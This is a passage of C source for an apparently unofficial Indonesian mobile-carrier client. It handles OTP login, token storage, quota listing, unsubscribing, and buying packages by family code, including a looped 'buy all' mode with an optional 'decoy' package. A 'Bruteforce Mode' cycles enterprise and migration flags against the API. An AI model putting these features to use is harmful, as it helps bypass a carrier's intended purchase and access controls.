                            new_num[strcspn(new_num, "\n")] = 0; clean_input_string(new_num);
                            if (strcmp(new_num, "99") == 0 || strlen(new_num) == 0) continue;
                            
                            printf("\n[*] Mengirim OTP ke %s...\n", new_num);
                            cJSON* otp_res = request_otp(B_CIAM, B_AUTH, UA, new_num);
                            if (otp_res) cJSON_Delete(otp_res);

                            printf("-------------------------------------------------------\n");
                            printf("Masukan 6-digit OTP yang dikirim ke %s\n", new_num);
                            printf("99. Batal\n");
                            printf("-------------------------------------------------------\n");
                            printf("OTP: "); fflush(stdout);

                            char otp_code[10];
                            if (fgets(otp_code, sizeof(otp_code), stdin) != NULL) {
                                otp_code[strcspn(otp_code, "\n")] = 0; clean_input_string(otp_code);
                                if (strcmp(otp_code, "99") == 0) {
                                    printf("\n[!] Login dibatalkan.\n");
                                    printf("Tekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                                } else {
                                    printf("\n[*] Verifikasi OTP...\n");
                                    cJSON* login_res = submit_otp(B_CIAM, B_AUTH, UA, AX_KEY ? AX_KEY : "dummy", new_num, otp_code);
                                    if (login_res && cJSON_GetObjectItem(login_res, "refresh_token")) {
                                        cJSON* rt_node = cJSON_GetObjectItem(login_res, "refresh_token"); const char* rt = (rt_node && cJSON_IsString(rt_node)) ? rt_node->valuestring : "";
                                        cJSON* acc_node = cJSON_GetObjectItem(login_res, "access_token"); const char* acc = (acc_node && cJSON_IsString(acc_node)) ? acc_node->valuestring : "";
                                        cJSON* idt_node = cJSON_GetObjectItem(login_res, "id_token"); const char* idt = (idt_node && cJSON_IsString(idt_node)) ? idt_node->valuestring : "";

                                        char real_sub_type[32] = "PREPAID";
                                        cJSON* prof_res = get_profile(B_API, API_KEY, XDATA_KEY, X_API_SEC, idt, acc);
                                        if (prof_res) {
                                            cJSON* p_data = cJSON_GetObjectItem(prof_res, "data");
                                            if (p_data) {
                                                cJSON* profile = cJSON_GetObjectItem(p_data, "profile");
                                                if (profile) {
                                                    cJSON* st = cJSON_GetObjectItem(profile, "subscription_type");
                                                    if (st && cJSON_IsString(st)) strncpy(real_sub_type, st->valuestring, sizeof(real_sub_type)-1);
                                                }
                                            }
                                            cJSON_Delete(prof_res);
                                        }

                                        cJSON *new_acct = cJSON_CreateObject();
                                        cJSON_AddNumberToObject(new_acct, "number", atof(new_num));
                                        cJSON_AddStringToObject(new_acct, "subscription_type", real_sub_type);
                                        cJSON_AddStringToObject(new_acct, "refresh_token", rt);
                                        cJSON_AddItemToArray(tokens_arr, new_acct);
                                        save_tokens(tokens_arr); active_account_idx = cJSON_GetArraySize(tokens_arr) - 1;
                                        authenticate_and_fetch_balance(tokens_arr, B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC);
                                        printf("\n[+] LOGIN BERHASIL!\n");
                                    } else {
                                        printf("\n[-] Login Gagal. Pastikan OTP benar dan tidak kedaluwarsa.\n");
                                    }
                                    if (login_res) cJSON_Delete(login_res);
                                    printf("Tekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                                }
                            }
                        }
                    }
                    else if (strncmp(cmd, "del ", 4) == 0) {
                        int del_idx = atoi(cmd + 4) - 1;
                        if (del_idx >= 0 && del_idx < cJSON_GetArraySize(tokens_arr)) {
                            cJSON_DeleteItemFromArray(tokens_arr, del_idx); save_tokens(tokens_arr);
                            if (del_idx == active_account_idx) { active_account_idx = 0; }
                            else if (del_idx < active_account_idx) { active_account_idx--; }
                            if (cJSON_GetArraySize(tokens_arr) > 0) authenticate_and_fetch_balance(tokens_arr, B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC);
                            else is_logged_in = 0;
                        }
                    }
                    else {
                        int sel_idx = atoi(cmd) - 1;
                        if (sel_idx >= 0 && sel_idx < cJSON_GetArraySize(tokens_arr)) {
                            active_account_idx = sel_idx;
                            authenticate_and_fetch_balance(tokens_arr, B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC);
                        }
                    }
                }
            }
        } 
        else if (strcmp(choice, "2") == 0) {
            if (!is_logged_in) { printf("\n[-] Anda harus login terlebih dahulu!\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }
            
            int goto_main = 0;
            while (1) {
                clear_screen();
                printf("\n=======================================================\n======================My Packages======================\n=======================================================\n");
                
                struct ActivePackage active_pkgs[100];
                int active_pkg_count = 0;
                
                cJSON* quota_res = get_quota(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                if (quota_res) {
                    cJSON* data = cJSON_GetObjectItem(quota_res, "data");
                    if (data) {
                        cJSON* quotas = cJSON_GetObjectItem(data, "quotas");
                        if (quotas && cJSON_IsArray(quotas)) {
                            int num = 1; cJSON* quota;
                            cJSON_ArrayForEach(quota, quotas) {
                                printf("fetching package no. %d details...\nFetching package...\n", num);
                                printf("=======================================================\nPackage %d\n", num);
                                
                                cJSON* name_item = cJSON_GetObjectItem(quota, "name"); cJSON* code_item = cJSON_GetObjectItem(quota, "quota_code");
                                cJSON* group_item = cJSON_GetObjectItem(quota, "group_name"); cJSON* gcode_item = cJSON_GetObjectItem(quota, "group_code");
                                cJSON* p_subs_type = cJSON_GetObjectItem(quota, "product_subscription_type"); cJSON* p_domain = cJSON_GetObjectItem(quota, "product_domain");
                                
                                const char* n_str = (name_item && cJSON_IsString(name_item)) ? name_item->valuestring : "Unknown";
                                const char* c_str = (code_item && cJSON_IsString(code_item)) ? code_item->valuestring : "-";
                                const char* g_str = (group_item && cJSON_IsString(group_item)) ? group_item->valuestring : "-";
                                const char* gc_str = (gcode_item && cJSON_IsString(gcode_item)) ? gcode_item->valuestring : "-";

                                char family_code_buf[128] = "-";
                                cJSON* pkg_det = get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, c_str);
                                if (pkg_det) {
                                    cJSON* d_data = cJSON_GetObjectItem(pkg_det, "data");
                                    if (d_data) {
                                        cJSON* p_fam = cJSON_GetObjectItem(d_data, "package_family");
                                        if (p_fam) {
                                            cJSON* pfc = cJSON_GetObjectItem(p_fam, "package_family_code");
                                            if (pfc && cJSON_IsString(pfc)) { strncpy(family_code_buf, pfc->valuestring, 127); }
                                        }
                                    }
                                    cJSON_Delete(pkg_det);
                                }

                                if (active_pkg_count < 100) {
                                    const char* pst_val = (p_subs_type && cJSON_IsString(p_subs_type)) ? p_subs_type->valuestring : "";
                                    const char* pd_val = (p_domain && cJSON_IsString(p_domain)) ? p_domain->valuestring : "";
                                    
                                    strncpy(active_pkgs[active_pkg_count].name, n_str, 127);
                                    strncpy(active_pkgs[active_pkg_count].quota_code, c_str, 127);
                                    strncpy(active_pkgs[active_pkg_count].prod_subs_type, pst_val, 63);
                                    strncpy(active_pkgs[active_pkg_count].prod_domain, pd_val, 63);
                                    strncpy(active_pkgs[active_pkg_count].family_code, family_code_buf, 127);
                                    active_pkg_count++;
                                }

                                printf("Name: %s\nBenefits:\n", n_str);
                                cJSON* benefits = cJSON_GetObjectItem(quota, "benefits");
                                if (benefits && cJSON_IsArray(benefits) && cJSON_GetArraySize(benefits) > 0) {
                                    cJSON* benefit; cJSON_ArrayForEach(benefit, benefits) {
                                        cJSON* b_id_item = cJSON_GetObjectItem(benefit, "id"); cJSON* b_name_item = cJSON_GetObjectItem(benefit, "name");
                                        cJSON* b_type_item = cJSON_GetObjectItem(benefit, "data_type"); cJSON* b_rem_item  = cJSON_GetObjectItem(benefit, "remaining"); cJSON* b_tot_item  = cJSON_GetObjectItem(benefit, "total");

                                        const char* b_id = (b_id_item && cJSON_IsString(b_id_item)) ? b_id_item->valuestring : "-";
                                        const char* b_name = (b_name_item && cJSON_IsString(b_name_item)) ? b_name_item->valuestring : "Unknown";
                                        const char* b_type = (b_type_item && cJSON_IsString(b_type_item)) ? b_type_item->valuestring : "UNKNOWN";
                                        double rem = b_rem_item ? (cJSON_IsNumber(b_rem_item) ? b_rem_item->valuedouble : atof(b_rem_item->valuestring)) : 0;
                                        double tot = b_tot_item ? (cJSON_IsNumber(b_tot_item) ? b_tot_item->valuedouble : atof(b_tot_item->valuestring)) : 0;

                                        printf("  -----------------------------------------------------\n  ID    : %s\n  Name  : %s\n  Type  : %s\n", b_id, b_name, b_type);
                                        if (strcmp(b_type, "DATA") == 0) {
                                            if (tot >= 1073741824.0) printf("  Kuota : %.2f GB / %.2f GB\n", rem / 1073741824.0, tot / 1073741824.0);
                                            else if (tot >= 1048576.0) printf("  Kuota : %.2f MB / %.2f MB\n", rem / 1048576.0, tot / 1048576.0);
                                            else if (tot >= 1024.0) printf("  Kuota : %.2f KB / %.2f KB\n", rem / 1024.0, tot / 1024.0);
                                            else printf("  Kuota : %.0f B / %.0f B\n", rem, tot);
                                        } else if (strcmp(b_type, "VOICE") == 0) { printf("  Kuota : %.2f / %.2f menit\n", rem / 60.0, tot / 60.0);
                                        } else if (strcmp(b_type, "TEXT") == 0) { printf("  Kuota : %.0f / %.0f SMS\n", rem, tot);
                                        } else { printf("  Kuota : %.0f / %.0f\n", rem, tot); }
                                    }
                                    printf("  -----------------------------------------------------\n");
                                } else { printf("  (Tidak ada detail benefit / Unlimited)\n"); }
                                
                                printf("Group Name: %s\nQuota Code: %s\nFamily Code: %s\nGroup Code: %s\n=======================================================\n", g_str, c_str, family_code_buf, gc_str);
                                num++;
                            }
                        } else { printf("[-] Tidak ada data kuota aktif di akun ini.\n"); }
                    }
                    cJSON_Delete(quota_res);
                }
                
                printf("Input nomor paket untuk lihat detail.\nInput del <nomor paket> untuk berhenti langganan.\n00. Kembali ke menu utama\nPilihan: "); fflush(stdout);
                char p_cmd[64];
                if (fgets(p_cmd, sizeof(p_cmd), stdin) != NULL) {
                    p_cmd[strcspn(p_cmd, "\n")] = 0; clean_input_string(p_cmd);
                    if (strcmp(p_cmd, "00") == 0 || strcmp(p_cmd, "99") == 0) break;
                    
                    if (strncmp(p_cmd, "del ", 4) == 0) {
                        const char* num_str = p_cmd + 4;
                        while (*num_str == ' ') num_str++;
                        int del_idx = -1;
                        if (*num_str >= '1' && *num_str <= '9') del_idx = atoi(num_str) - 1;
                        if (del_idx >= 0 && del_idx < active_pkg_count) {
                            printf("-------------------------------------------------------\n");
                            printf("Yakin ingin berhenti langganan paket:\n%d. %s ?\n", del_idx + 1, active_pkgs[del_idx].name);
                            printf("(y/n): "); fflush(stdout);
                            char conf[10];
                            if (fgets(conf, sizeof(conf), stdin) && (conf[0] == 'y' || conf[0] == 'Y')) {
                                printf("[*] Membatalkan langganan paket %s...\n", active_pkgs[del_idx].name);
                                // PERUBAHAN: tambahkan acc_tok sebagai parameter ke-6
                                cJSON* u_res = unsubscribe(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, acc_tok, active_pkgs[del_idx].quota_code, active_pkgs[del_idx].prod_subs_type, active_pkgs[del_idx].prod_domain);
                                if (u_res && cJSON_GetObjectItem(u_res, "code") && strcmp(cJSON_GetObjectItem(u_res, "code")->valuestring, "000") == 0) {
                                    printf("[+] Berhasil berhenti langganan paket.\n");
                                } else {
                                    printf("[-] Gagal berhenti langganan paket.\n");
                                }
                                if (u_res) {
                                    char* err_out = cJSON_Print(u_res);
                                    printf("Respons Server:\n%s\n", err_out);
                                    free(err_out);
                                    cJSON_Delete(u_res);
                                }
                            } else { printf("[!] Dibatalkan.\n"); }
                            printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                        } else {
                            printf("[-] Nomor paket tidak valid. Masukkan angka 1 sampai %d.\n", active_pkg_count);
                            printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                        }
                    } else {
                        int sel_idx = atoi(p_cmd) - 1;
                        if (sel_idx >= 0 && sel_idx < active_pkg_count) {
                            printf("\n[*] Mengambil detail paket %s...\n", active_pkgs[sel_idx].name);
                            cJSON* d_res = get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, active_pkgs[sel_idx].quota_code);
                            if (d_res && cJSON_GetObjectItem(d_res, "data")) {
                                cJSON* d_data = cJSON_GetObjectItem(d_res, "data");
                                print_package_details(d_data, active_pkgs[sel_idx].family_code, active_pkgs[sel_idx].quota_code, B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                                
                                cJSON* p_opt = cJSON_GetObjectItem(d_data, "package_option");
                                cJSON* price_item = cJSON_GetObjectItem(p_opt, "price");
                                int price = price_item ? (cJSON_IsNumber(price_item) ? price_item->valueint : atoi(price_item->valuestring)) : 0;
                                cJSON* name_node = cJSON_GetObjectItem(p_opt, "name"); const char* name = (name_node && cJSON_IsString(name_node)) ? name_node->valuestring : "";
                                cJSON* conf_node = cJSON_GetObjectItem(d_data, "token_confirmation"); const char* conf = (conf_node && cJSON_IsString(conf_node)) ? conf_node->valuestring : "";
                                cJSON* p_fam = cJSON_GetObjectItem(d_data, "package_family");
                                cJSON* p_for_item = cJSON_GetObjectItem(p_fam, "payment_for");
                                const char* p_for = (p_for_item && p_for_item->valuestring) ? p_for_item->valuestring : "BUY_PACKAGE";

                                handle_payment_menu(B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, tokens_arr, active_pkgs[sel_idx].quota_code, price, name, conf, p_for, NULL, &goto_main);
                            } else {
                                printf("[-] Gagal mengambil detail paket.\n");
                                printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                            }
                            if (d_res) cJSON_Delete(d_res);
                        } else {
                            printf("[-] Nomor paket tidak valid. Masukkan angka 1 sampai %d.\n", active_pkg_count);
                            printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                        }
                    }
                }
                if (goto_main) break;
            }
        }
        else if (strcmp(choice, "3") == 0) {
            if (!is_logged_in) { printf("\n[-] Anda harus login terlebih dahulu!\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }
            
            FILE *f = fopen("/etc/engsel/hot_data/hot.json", "r");
            if (!f) { printf("\n[-] File hot_data/hot.json tidak ditemukan!\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }
            fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET);
            char *json_data = malloc(fsize + 1); fread(json_data, 1, fsize, f); fclose(f); json_data[fsize] = 0;
            
            sanitize_json_string(json_data);
            cJSON* hot_arr = cJSON_Parse(json_data); free(json_data);
            if (!hot_arr || !cJSON_IsArray(hot_arr)) { printf("\n[-] Gagal memparsing hot.json\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }
            
            int goto_main = 0;
            while (1) {
                clear_screen();
                printf("=======================================================\n               Paket  Hot 🔥\n=======================================================\n");
                int count = cJSON_GetArraySize(hot_arr);
                for (int i = 0; i < count; i++) {
                    cJSON* item = cJSON_GetArrayItem(hot_arr, i);
                    cJSON* fn = cJSON_GetObjectItem(item, "family_name"); cJSON* vn = cJSON_GetObjectItem(item, "variant_name"); cJSON* on = cJSON_GetObjectItem(item, "option_name");
                    printf("%d. %s - %s - %s\n-------------------------------------------------------\n", i + 1, fn?fn->valuestring:"", vn?vn->valuestring:"", on?on->valuestring:"");
                }
                printf("00. Kembali ke menu utama\n-------------------------------------------------------\nPilih paket (nomor): "); fflush(stdout);
                
                char h_choice[16];
                if (fgets(h_choice, sizeof(h_choice), stdin) != NULL) {
                    h_choice[strcspn(h_choice, "\n")] = 0; clean_input_string(h_choice);
                    if (strcmp(h_choice, "00") == 0) { break; } 
                    if (strcmp(h_choice, "99") == 0) { break; }
                    
                    int sel = atoi(h_choice);
                    if (sel > 0 && sel <= count) {
                        cJSON* selected_bm = cJSON_GetArrayItem(hot_arr, sel - 1);
                        cJSON* fc_item = cJSON_GetObjectItem(selected_bm, "family_code"); cJSON* ie_item = cJSON_GetObjectItem(selected_bm, "is_enterprise");
                        cJSON* vn_item = cJSON_GetObjectItem(selected_bm, "variant_name"); cJSON* ord_item = cJSON_GetObjectItem(selected_bm, "order");
                        
                        if (!fc_item || !vn_item || !ord_item) { printf("[-] Data hot.json tidak lengkap.\n"); }
                        else {
                            const char* f_code = fc_item->valuestring; const char* v_name = vn_item->valuestring;
                            int target_order = ord_item->valueint; int is_ent = (ie_item && cJSON_IsTrue(ie_item)) ? 1 : -1;
                            
                            printf("\n[*] Menarik data keluarga paket (Bruteforce Mode)...\n");
                            cJSON* fam_res = do_family_bruteforce(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, f_code, is_ent, NULL);
                            
                            if (fam_res) {
                                cJSON* data = cJSON_GetObjectItem(fam_res, "data");
                                cJSON* variants = cJSON_GetObjectItem(data, "package_variants");
                                char target_opt_code[256] = {0};
                                
                                cJSON* variant;
                                cJSON_ArrayForEach(variant, variants) {
                                    cJSON* vname = cJSON_GetObjectItem(variant, "name");
                                    if (vname && strcmp(vname->valuestring, v_name) == 0) {
                                        cJSON* options = cJSON_GetObjectItem(variant, "package_options");
                                        cJSON* opt;
                                        cJSON_ArrayForEach(opt, options) {
                                            cJSON* ord = cJSON_GetObjectItem(opt, "order");
                                            if (ord && ord->valueint == target_order) {
                                                cJSON* oc = cJSON_GetObjectItem(opt, "package_option_code");
                                                if (oc) if(oc && cJSON_IsString(oc)) { strncpy(target_opt_code, oc->valuestring, sizeof(target_opt_code)-1); target_opt_code[sizeof(target_opt_code)-1]='\0'; }
                                                break;
                                            }
                                        }
                                        break;
                                    }
                                }
                                
                                if (strlen(target_opt_code) > 0) {
                                    printf("\n[*] Mengambil detail untuk transaksi...\n");
                                    cJSON* d_res = get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, target_opt_code);
                                    if (d_res && cJSON_GetObjectItem(d_res, "data")) {
                                        cJSON* d_data = cJSON_GetObjectItem(d_res, "data"); cJSON* p_opt = cJSON_GetObjectItem(d_data, "package_option"); cJSON* p_fam = cJSON_GetObjectItem(d_data, "package_family");
                                        cJSON* price_item = cJSON_GetObjectItem(p_opt, "price"); int price = price_item ? (cJSON_IsNumber(price_item) ? price_item->valueint : atoi(price_item->valuestring)) : 0;
                                        cJSON* name_node = cJSON_GetObjectItem(p_opt, "name"); const char* name = (name_node && cJSON_IsString(name_node)) ? name_node->valuestring : ""; cJSON* conf_node = cJSON_GetObjectItem(d_data, "token_confirmation"); const char* conf = (conf_node && cJSON_IsString(conf_node)) ? conf_node->valuestring : "";
                                        cJSON* p_for_item = cJSON_GetObjectItem(p_fam, "payment_for"); const char* p_for = (p_for_item && p_for_item->valuestring) ? p_for_item->valuestring : "BUY_PACKAGE";

                                        print_package_details(d_data, f_code, target_opt_code, B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                                        
                                        handle_payment_menu(B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, tokens_arr, target_opt_code, price, name, conf, p_for, selected_bm, &goto_main);
                                    } else {
                                        printf("[-] Gagal mengambil detail paket.\n");
                                        printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                                    }
                                    if (d_res) cJSON_Delete(d_res);
                                } else {
                                    printf("[-] Varian/Order tidak ditemukan di Family tersebut.\n");
                                    printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                                }
                                cJSON_Delete(fam_res);
                            } else {
                                printf("[-] Gagal mengambil data Family Code.\n");
                                printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                            }
                        }
                    }
                }
                if (goto_main) break;
            }
            cJSON_Delete(hot_arr);
        }
        else if (strcmp(choice, "4") == 0) {
            if (!is_logged_in) { printf("\n[-] Anda harus login terlebih dahulu!\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }
            char f_code[256]; printf("\nMasukkan Family Code: "); fflush(stdout);
            if (fgets(f_code, sizeof(f_code), stdin) != NULL) {
                f_code[strcspn(f_code, "\n")] = 0; clean_input_string(f_code);
                printf("\n[*] Menarik data keluarga paket (Bruteforce Mode)...\n");
                
                int successful_ent = -1;
                char family_name_str[256] = "";
                const char* migrations[] = {"NONE", "PRE_TO_PRIOH", "PRIOH_TO_PRIO", "PRIO_TO_PRIOH"}; int enterprises[] = {0, 1}; cJSON* fam_res = NULL; int found = 0;
                for (int i = 0; i < 4 && !found; i++) {
                    for (int j = 0; j < 2 && !found; j++) {
                        printf("[-] Mencoba is_ent=%d, mig=%s...\n", enterprises[j], migrations[i]);
                        fam_res = get_family(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, f_code, enterprises[j], migrations[i]);
                        if (fam_res && cJSON_GetObjectItem(fam_res, "status") && strcmp(cJSON_GetObjectItem(fam_res, "status")->valuestring, "SUCCESS") == 0) {
                            cJSON* data = cJSON_GetObjectItem(fam_res, "data");
                            cJSON* variants = data ? cJSON_GetObjectItem(data, "package_variants") : NULL;
                            if (variants && cJSON_GetArraySize(variants) > 0) {
                                found = 1; successful_ent = enterprises[j];
                                cJSON* name = cJSON_GetObjectItem(cJSON_GetObjectItem(data, "package_family"), "name");
                                if (name && name->valuestring && strlen(name->valuestring) > 0) {
                                    strncpy(family_name_str, name->valuestring, 255);
                                    printf("[+] Ditemukan! Family Name: %s\n", name->valuestring); 
                                }
                            }
                        }
                        if (!found && fam_res) { cJSON_Delete(fam_res); fam_res = NULL; }
                        if (found) break;
                    }
                    if (found) break;
                }
                
                if (fam_res && found) {
                    int goto_main = 0;
                    while (1) {
                        cJSON* data = cJSON_GetObjectItem(fam_res, "data"); cJSON* variants = cJSON_GetObjectItem(data, "package_variants");
                        int opt_num = 1; char codes[500][256]; 
                        cJSON* bm_infos[500]; for(int i=0; i<500; i++) bm_infos[i] = NULL;
                        
                        printf("=======================================================\n");
                        cJSON* variant; cJSON_ArrayForEach(variant, variants) {
                            cJSON* vname_item = cJSON_GetObjectItem(variant, "name");
                            const char* vname = (vname_item && cJSON_IsString(vname_item)) ? vname_item->valuestring : "";
                            cJSON* options = cJSON_GetObjectItem(variant, "package_options"); cJSON* opt;
                            cJSON_ArrayForEach(opt, options) {
                                cJSON* n = cJSON_GetObjectItem(opt, "name"); cJSON* p = cJSON_GetObjectItem(opt, "price"); cJSON* c = cJSON_GetObjectItem(opt, "package_option_code");
                                cJSON* ord_item = cJSON_GetObjectItem(opt, "order");
                                if (n && p && c && opt_num < 500) {
                                    double price_val = cJSON_IsNumber(p) ? p->valuedouble : atof(p->valuestring);
                                    const char* oname = cJSON_IsString(n) ? n->valuestring : "";
                                    int order = (ord_item && cJSON_IsNumber(ord_item)) ? ord_item->valueint : 0;
                                    
                                    bm_infos[opt_num] = cJSON_CreateObject();
                                    cJSON_AddStringToObject(bm_infos[opt_num], "family_name", family_name_str);
                                    cJSON_AddStringToObject(bm_infos[opt_num], "family_code", f_code);
                                    if (successful_ent == -1) cJSON_AddNullToObject(bm_infos[opt_num], "is_enterprise"); else cJSON_AddBoolToObject(bm_infos[opt_num], "is_enterprise", successful_ent);
                                    cJSON_AddNullToObject(bm_infos[opt_num], "migration_type");
                                    cJSON_AddStringToObject(bm_infos[opt_num], "variant_name", vname);
                                    cJSON_AddStringToObject(bm_infos[opt_num], "option_name", oname);
                                    cJSON_AddNumberToObject(bm_infos[opt_num], "order", order);
                                    
                                    printf("%d. %s - Rp %.0f\n", opt_num, oname, price_val);
                                    strcpy(codes[opt_num], cJSON_IsString(c) ? c->valuestring : "-"); opt_num++;
                                }
                            }
                        }
                        printf("=======================================================\n00. Kembali ke menu utama\n-------------------------------------------------------\nPilih nomor paket untuk dibeli: "); fflush(stdout);
                        
                        char opt_choice[10];
                        if (fgets(opt_choice, sizeof(opt_choice), stdin) != NULL) {
                            opt_choice[strcspn(opt_choice, "\n")] = 0; clean_input_string(opt_choice);
                            if (strcmp(opt_choice, "00") == 0) {
                                for(int i=1; i<opt_num; i++) { if(bm_infos[i]) cJSON_Delete(bm_infos[i]); }
                                break; 
                            }
                            
                            int sel = atoi(opt_choice);
                            if (sel > 0 && sel < opt_num) {
                                printf("\n[*] Mengambil detail untuk transaksi...\n");
                                cJSON* d_res = get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, codes[sel]);
                                if (d_res && cJSON_GetObjectItem(d_res, "data")) {
                                    cJSON* d_data = cJSON_GetObjectItem(d_res, "data"); cJSON* p_opt = cJSON_GetObjectItem(d_data, "package_option"); cJSON* p_fam = cJSON_GetObjectItem(d_data, "package_family");
                                    cJSON* price_item = cJSON_GetObjectItem(p_opt, "price"); int price = price_item ? (cJSON_IsNumber(price_item) ? price_item->valueint : atoi(price_item->valuestring)) : 0;
                                    cJSON* name_node = cJSON_GetObjectItem(p_opt, "name"); const char* name = (name_node && cJSON_IsString(name_node)) ? name_node->valuestring : ""; cJSON* conf_node = cJSON_GetObjectItem(d_data, "token_confirmation"); const char* conf = (conf_node && cJSON_IsString(conf_node)) ? conf_node->valuestring : "";
                                    cJSON* p_for_item = cJSON_GetObjectItem(p_fam, "payment_for"); const char* p_for = (p_for_item && p_for_item->valuestring) ? p_for_item->valuestring : "BUY_PACKAGE";

                                    print_package_details(d_data, f_code, codes[sel], B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                                    
                                    handle_payment_menu(B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, tokens_arr, codes[sel], price, name, conf, p_for, bm_infos[sel], &goto_main);
                                } else {
                                    printf("[-] Gagal mengambil detail paket.\n");
                                    printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                                }
                                if (d_res) cJSON_Delete(d_res);
                            } else {
                                printf("Invalid package number.\n");
                                printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                            }
                        }
                        for(int i=1; i<opt_num; i++) { if(bm_infos[i]) cJSON_Delete(bm_infos[i]); }
                        if (goto_main) break;
                    }
                    cJSON_Delete(fam_res);
                } else { 
                    printf("[-] Gagal mengambil data Family Code. Pastikan kode benar.\n"); 
                    printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout); flush_stdin();
                }
            }
        }
        else if (strcmp(choice, "5") == 0) {
            if (!is_logged_in) { printf("\n[-] Anda harus login terlebih dahulu!\nTekan Enter..."); fflush(stdout); flush_stdin(); continue; }

            clear_screen();
            printf("=======================================================\n");
            printf("       Beli Semua Paket di Family Code (Loop)\n");
            printf("=======================================================\n");

            char f_code[256] = {0};
            printf("Family Code  : "); fflush(stdout);
            if (fgets(f_code, sizeof(f_code), stdin) == NULL) { continue; }
            f_code[strcspn(f_code, "\n")] = 0; clean_input_string(f_code);
            if (strlen(f_code) == 0) {
                printf("[-] Family Code tidak boleh kosong.\n");
                printf("\nTekan Enter untuk kembali..."); fflush(stdout); flush_stdin(); continue;
            }

            char start_str[10] = "1";
            printf("Mulai dari opsi nomor (default 1): "); fflush(stdout);
            if (fgets(start_str, sizeof(start_str), stdin) != NULL) start_str[strcspn(start_str, "\n")] = 0;
            int start_opt = atoi(start_str); if (start_opt < 1) start_opt = 1;

            char use_decoy_str[10] = "n";
            printf("Gunakan paket decoy? (y/n): "); fflush(stdout);
            if (fgets(use_decoy_str, sizeof(use_decoy_str), stdin) != NULL) use_decoy_str[strcspn(use_decoy_str, "\n")] = 0;
            int use_decoy = (use_decoy_str[0] == 'y' || use_decoy_str[0] == 'Y') ? 1 : 0;

            char pause_str[10] = "n";
            printf("Jeda/Pause setiap transaksi berhasil? (y/n): "); fflush(stdout);
            if (fgets(pause_str, sizeof(pause_str), stdin) != NULL) pause_str[strcspn(pause_str, "\n")] = 0;
            int do_pause = (pause_str[0] == 'y' || pause_str[0] == 'Y') ? 1 : 0;

            char delay_str[10] = "0";
            printf("Delay antar transaksi (detik, 0 = tanpa delay): "); fflush(stdout);
            if (fgets(delay_str, sizeof(delay_str), stdin) != NULL) delay_str[strcspn(delay_str, "\n")] = 0;
            int delay_sec = atoi(delay_str); if (delay_sec < 0) delay_sec = 0;

            printf("-------------------------------------------------------\n");
            printf("Family Code  : %s\n", f_code);
            printf("Mulai Opsi   : %d\n", start_opt);
            printf("Gunakan Decoy: %s\n", use_decoy ? "Ya" : "Tidak");
            printf("Pause        : %s\n", do_pause ? "Ya" : "Tidak");
            printf("Delay        : %d detik\n", delay_sec);
            printf("-------------------------------------------------------\n");
            printf("Lanjutkan? (y/n): "); fflush(stdout);
            char go_str[10] = "n";
            if (fgets(go_str, sizeof(go_str), stdin) != NULL) go_str[strcspn(go_str, "\n")] = 0;
            if (go_str[0] != 'y' && go_str[0] != 'Y') {
                printf("[!] Dibatalkan.\n");
                printf("\nTekan Enter untuk kembali..."); fflush(stdout); flush_stdin(); continue;
            }

            printf("\n[*] Menarik data keluarga paket (Bruteforce Mode)...\n");

            const char* migrations[] = {"NONE", "PRE_TO_PRIOH", "PRIOH_TO_PRIO", "PRIO_TO_PRIOH"};
            int enterprises[] = {0, 1};
            cJSON* fam_res = NULL; int found = 0;
            for (int i = 0; i < 4 && !found; i++) {
                for (int j = 0; j < 2 && !found; j++) {
                    printf("[-] Mencoba is_ent=%d, mig=%s...\n", enterprises[j], migrations[i]);
                    fam_res = get_family(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, f_code, enterprises[j], migrations[i]);
                    if (fam_res && cJSON_GetObjectItem(fam_res, "status") &&
                        strcmp(cJSON_GetObjectItem(fam_res, "status")->valuestring, "SUCCESS") == 0) {
                        cJSON* d5 = cJSON_GetObjectItem(fam_res, "data");
                        cJSON* v5 = d5 ? cJSON_GetObjectItem(d5, "package_variants") : NULL;
                        if (v5 && cJSON_GetArraySize(v5) > 0) { found = 1; }
                    }
                    if (!found && fam_res) { cJSON_Delete(fam_res); fam_res = NULL; }
                    if (found) break;
                }
                if (found) break;
            }

            if (!fam_res || !found) {
